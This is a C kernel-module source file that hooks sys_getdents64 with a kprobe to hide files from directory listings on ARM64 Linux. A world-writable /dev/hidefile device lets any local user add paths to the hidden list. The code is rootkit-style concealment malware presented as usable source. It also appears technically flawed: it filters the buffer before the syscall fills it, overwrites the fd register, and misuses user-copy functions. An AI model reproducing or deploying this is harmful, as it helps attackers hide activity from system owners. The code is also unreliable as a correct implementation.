/*
 * vfs_hook.c - VFS getdents64 hook for file hiding
 * ARM64 compatible
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/proc_fs.h>

#include "hook.h"

MODULE_LICENSE("GPL");

/* Hidden file storage managed by hook_manager */
extern bool is_hidden(const char *name, bool is_dir);

/* Directory entry structure for getdents64 */
struct dirent_entry {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[256];
};

/* getdents64 pre_handler - filter directory entries */
static int pre_getdents64(struct kprobe *p, struct pt_regs *regs)
{
    struct dirent_entry __user *dirent;
    int count;
    struct dirent_entry *kbuf;
    struct dirent_entry *curr;
    struct dirent_entry *prev;
    int total;
    int new_count;
    char name[256];

    /* ARM64: x0=fd, x1=dirent, x2=count */
    dirent = (struct dirent_entry __user *)regs->regs[1];
    count = (int)regs->regs[2];

    if (count <= 0)
        return 0;

    kbuf = kmalloc(count + 4096, GFP_ATOMIC);
    if (!kbuf)
        return 0;

    if (copy_from_user(kbuf, dirent, count)) {
        kfree(kbuf);
        return 0;
    }

    curr = kbuf;
    total = count;
    new_count = 0;
    prev = NULL;

    while (total > 0) {
        unsigned short reclen = curr->d_reclen;

        if (reclen == 0 || reclen > total)
            break;

        memset(name, 0, sizeof(name));
        strncpy_from_user(name, curr->d_name, sizeof(name) - 1);

        /* Check if this entry should be hidden */
        if (!is_hidden(name, false)) {
            prev = curr;
            new_count += reclen;
        } else {
            /* Remove this entry by adjusting previous's reclen */
            if (prev) {
                prev->d_reclen += reclen;
            } else {
                /* First entry is hidden, adjust offset */
                new_count -= reclen;
            }
        }

        total -= reclen;
        curr = (struct dirent_entry *)((char *)curr + reclen);
    }

    if (new_count > 0 && new_count <= count) {
        if (!copy_to_user(dirent, kbuf, new_count)) {
            regs->regs[0] = new_count;
        }
    }

    kfree(kbuf);
    return 0;
}

/* Kprobe for sys_getdents64 */
static struct kprobe kp_getdents64 = {
    .symbol_name = "sys_getdents64",
    .pre_handler = pre_getdents64,
};

/* Device node management */
static struct miscdevice hidefile_dev;
static bool dev_registered = false;

static ssize_t hidefile_write(struct file *file, const char __user *buf,
                              size_t count, loff_t *ppos)
{
    char *kbuf;
    char *path;
    int ret;

    if (count == 0)
        return 0;

    kbuf = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    if (copy_from_user(kbuf, buf, count)) {
        kfree(kbuf);
        return -EFAULT;
    }
    kbuf[count] = '\0';

    /* Remove trailing newline */
    path = strim(kbuf);

    /* Check if removing device */
    if (strcmp(path, "0") == 0) {
        if (dev_registered) {
            misc_deregister(&hidefile_dev);
            dev_registered = false;
            pr_info("hook: /dev/hidefile removed\n");
        }
        kfree(kbuf);
        return count;
    }

    /* Add file to hidden list */
    ret = add_hidden_file(path, false);
    if (ret == 0) {
        pr_info("hook: hidden file added: %s\n", path);
    } else if (ret == -EEXIST) {
        pr_info("hook: file already hidden: %s\n", path);
    } else {
        pr_err("hook: failed to add hidden file: %s (err=%d)\n", path, ret);
    }

    kfree(kbuf);
    return count;
}

static ssize_t hidefile_read(struct file *file, char __user *buf,
                             size_t count, loff_t *ppos)
{
    return 0;
}

static struct file_operations hidefile_fops = {
    .owner = THIS_MODULE,
    .read = hidefile_read,
    .write = hidefile_write,
};

static struct miscdevice hidefile_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "hidefile",
    .fops = &hidefile_fops,
    .mode = 0666,
};

int vfs_hook_init(void)
{
    int ret;

    /* Register kprobe */
    ret = register_kprobe(&kp_getdents64);
    if (ret < 0) {
        pr_err("hook: failed to register getdents64 kprobe: %d\n", ret);
        return ret;
    }
    pr_info("hook: getdents64 kprobe registered at %px\n", kp_getdents64.addr);

    /* Register device node */
    ret = misc_register(&hidefile_dev);
    if (ret < 0) {
        pr_err("hook: failed to register misc device: %d\n", ret);
        unregister_kprobe(&kp_getdents64);
        return ret;
    }
    dev_registered = true;
    pr_info("hook: /dev/hidefile created\n");

    return 0;
}

void vfs_hook_exit(void)
{
    if (dev_registered) {
        misc_deregister(&hidefile_dev);
        dev_registered = false;
    }
    unregister_kprobe(&kp_getdents64);
    pr_info("hook: vfs hook unregistered\n");
}
